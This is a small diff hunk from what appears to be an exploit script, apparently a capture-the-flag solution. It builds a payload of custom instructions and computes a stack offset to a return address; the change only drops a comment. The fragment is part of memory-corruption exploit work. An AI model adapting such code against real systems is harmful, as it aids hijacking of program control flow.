@@ -124,7 +124,7 @@ payload += mov_reg(4, 0xFF)
 payload += copy(4, 3, 6 * 8 + 1)
 
 # stack offset
-ret_stack_offset = 0x00007FFE9DE31068 - 0x7FFE9DE30F38 - 0x18  # 0x130 + 0x10
+ret_stack_offset = 0x00007FFE9DE31068 - 0x7FFE9DE30F38 - 0x18 
 payload += mov_reg(3, ret_stack_offset)
 payload += minus_reg(5, 3)
 
